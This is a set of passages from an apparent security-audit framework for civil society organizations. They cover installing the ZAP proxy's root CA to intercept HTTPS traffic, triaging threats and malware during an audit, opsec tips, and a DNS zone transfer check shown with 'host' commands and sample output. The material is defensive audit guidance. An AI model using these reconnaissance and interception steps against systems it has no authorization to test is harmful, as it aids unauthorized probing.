localhost\nPort:       8080\n\nNote: Remember that Burpsuite and other proxies also uses the same address and port number. Be reminded to close any proxy application that you are not using.\n\nSince that ZAP is acting as a proxy between your browser and the web application, the use of SSL(HTTPS) may cause the certificate validation to fail and the connection be terminated. This happen because ZAP encrypts and decrypts traffic sent to the web application using the original web applications certificate. This is done so ZAP can access the plaintext in the request and the response.\n\nTo prevent this, ZAP creates an SSL cert automatically for each host you access, and signed by ZAP's CA certificate. To setup your browser to trust these SSL certs, you need to import and trust the ZAP root CA certificate. Once it's done, the other ZAP certificates signed by it will be trusted as well.\n\nKeep the self-generated Root CA certificate to avoid creating a vulnerability.\n\n1. Start ZAP and click Tools -> Options.\n2. On the left pane of the Options window, click Dynamic SSL Certificates.\n3. On the right pane, click Save.\n4. Select a location to save the certificate to and click Save. Be sure to retain the .cer file extension.\n\nTo install the ZAP Root CA certificate as trusted root certificate for Windows/Chrome:\n\n1. Browse to the certificate file location.\n2. Right-click on the certificate file and then click Install Certificate.\n3. In the Certificate Import Wizard, select either Current User or Local Machine as the scope of the certificate, then click Next.\n4. Select Place all certificates in the following store.\n5. Click Browse and select Trusted Root Certificate Authorities or Trusted Root Certificates (depending on your version of Windows) as the certificate store, then click Next.\n6. Click Finish.\n7. Review the security warning about trusted root certificates and click Yes if the warning is accepted.\n\nTo verify that the ZAP Root CA certificate is installed:\n\n1. Open Control Panel and click Internet Options.\n2. On the Content tab, in the Certificates section, click Certificates.\n3. On the Trusted Root Certificates tab, verify that the ZAP Root CA certificate is listed.\n\nIf you are testing using Firefox, you need to install the ZAP Root CA certificate a second time\ninto Firefox’s own certificate store.\n\nTo install the ZAP Root CA for Mozilla Firefox:\n\n1. Start Firefox and click Preferences.\n2. On the Advanced tab, click the Encryption tab.\n3. Click View Certificates.\n4. On the Trusted root certificates tab, click Import and select the ZAP Root CA file you saved previously.\n5. In the Import wizard, select Trust this CA to identify web sites.\n6. Click OK.\n\nAdditional ZAP references:\n * [Wiki and QuickStart Guide](https://www.zaproxy.org/getting-started)\n * [Overall walkthrough](https://www.stationx.net/owasp-zap-tutorial/)\n * [Official Docs](https://www.zaproxy.org/docs)\n * [Collection of Tutorial videos from ZAP](https://www.youtube.com/playlist?list=PLEBitBW-Hlsv8cEIUntAO8st2UGhmrjUB)\n___\n\n###### Variant: Nikto Web Scanner (Active)\n\n**Introduction**\n\nNikto is a tool that comes with Kali Linux.

While there is some truth to this, it is not\nuseful advice for small scale civil society organizations or independent media\nhouses. The risks that advocacy and media organizations face are far more\nvaried, and the cost of lost information can be crippling to their ability to\noperate.\n\nDepending on the specific threats for each organization, the auditor should\nconsider the challenges of not only one-time exfiltration of data as well as\npotential ways an adversary could use physical access or proximity to the\norganization or its devices to gain ongoing remote access, track, or cause\nharm to the organization through the outright destruction of data.\n","guiding_questions":"* Who has physical access to what?

In-depth binary analysis is best kept for post-audit work during the reporting and follow-up phases. If critical assets are compromised, the auditor might need to coordinate urgent mitigation measures with other IT experts.\n\nTime management is extremely crucial when responding to potential malware infections and similar more advanced threats. If using this method, the auditor should constantly question whether to continue this process or complete other aspects of their audit plan. At the end of the audit process, not having an understanding of the organization's risk tolerance, existing capacity, current practices/processes/policies and existing informational assets will undermine the auditor's ability to provide a prioritized report or understand the context around the potentially malicious activity they have uncovered.\n\nThe main outputs of advanced threats identification should be evidence like files, emails, screenshots and URLs included in messages or spotted in suspicious connections.\n","operational_security":"* For engagements with high levels of potential threats, the auditor should conduct a more comprehensive **Adversary Capability Assessment** - based on the the technical context research work.

Take extreme care with identifying or potentially targeted information.\n* Use VPNs or Tor to search if conducting the search from a country that is highly competitive with the organization’s country, or is known to surveil.\n* For severe infections or incidents, the auditor and the organization may agree, through the Incident Response Plan, to clean or reformat critical devices.

Some organizations prioritize an 'audit-only' approach in which no changes are made to systems, vulnerabilities, or staff capacity. In other cases, the organization will benefit from quick action to resolve issues.

As such, it is not inherently dangerous, but it does require that the organization not rely on the assumption that unpublicized URLs are in fact secret.\n\nAn overly permissive domain name service (DNS) provider allows an attacker to enumerate online services that the organization might think are “hidden” because they have not been (intentionally) published. A zone transfer returns all of the hostnames at a particular domain, or “zone.” So, a request for example.com may return www.example.com, webmail.example.com and ftp.example.com, along with other less obviously guessable targets, such as wordpress-testing.example.com.\n\nWhile any user should be able to use a name server to look up a hostname and convert it to the corresponding IP address, most well-administered name servers allow full “zone transfer” requests only from a specific list of authorized locations (often themselves subsidiary name servers).\n\nDetermine the authoritative name server(s) for the organization’s primary domain:\n\n```\n$ host -t ns example.com\nexample.com name server ns1.something.net.\nexample.com name server ns2.something.net.\n```\n\nAttempt a zone transfer on that domain, using that name server:\n\n```\n$ host -l example.com ns1.something.net\nUsing domain server:\nName: ns1.something.net\nAddress: 256.0.0.1#53\nAliases:\n\nwww.example.com has address 256.0.0.2\nmail.example.com has address 256.0.0.3\nwebmail.example.com has address 256.0.0.4\nftp.example.com has address 256.0.0.5\nfoo.example.com has address 256.0.0.6\nbar.example.com has address 256.0.0.7\n```\n\nIf the zone transfer is successful, this is a finding to include in your report as well as an associated recommendation to reconfigure their DNS service to now allow public zone transfers.
